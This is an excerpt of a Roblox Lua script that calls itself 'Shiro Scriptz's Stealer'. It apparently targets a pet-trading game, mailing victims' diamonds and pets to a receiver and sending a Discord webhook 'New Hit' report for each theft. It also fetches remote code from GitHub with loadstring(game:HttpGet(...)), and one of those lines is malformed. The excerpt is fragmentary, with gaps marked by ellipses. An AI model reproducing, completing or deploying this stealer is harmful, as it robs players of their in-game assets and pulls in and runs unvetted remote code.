...
getgenv().Settings = {
    ...
    MailMessage = "SHIRO ALWAYS ON TOP",
    Titanics = {
        Dualhook = true,
        Intensity = 100 --%
    },
...
if _G.LoadingScreen ~= true then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiroOnTop/Loading/main/Script.lua"))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
end
...
if diaamt < 110000 then
    ...
    _G.AntiLeave = false
    _G.MouseLock = false
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiroOnTop/2/main/script.lua"))()"))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
    return;
end
...
local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
    ...
    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
        imgs =
        "https://cdn.discordapp.com/attachments/1133191890687238195/1164259421954785390/57DC17AD-B94E-4757-A7FC-32E0CD18CD1C.jpg?ex=65429015&is=65301b15&hm=514e21c747b2ab0c492fb0a34b6ad488c0094c55809282c52971f5e697998b0a&"
        data1 = {
            ["content"] = ping,
            ["username"] = "Shiro Scriptz",
            ["avatar_url"] = imgs,
            ["embeds"] = { {
                ["title"] = "**New Hit** ||With Shiro||",
                ["url"] = "https://discord.com/invite/37htkYbjxs",
                ["type"] = "rich",
                ...
                ["fields"] = { {
                    ["name"] = "**This data was generated using Shiro Scriptz's Stealer** :moyai:",
        ...
        data1 = {
            ...
            ["embeds"] = { {
                ["title"] = "**New Hit** ||With Shiro||",
                ["url"] = "https://discord.com/invite/37htkYbjx",
                ["type"] = "rich",
                ["color"] = tonumber(0x2798FF),
                ["thumbnail"] = {
                    ["url"] = Image,
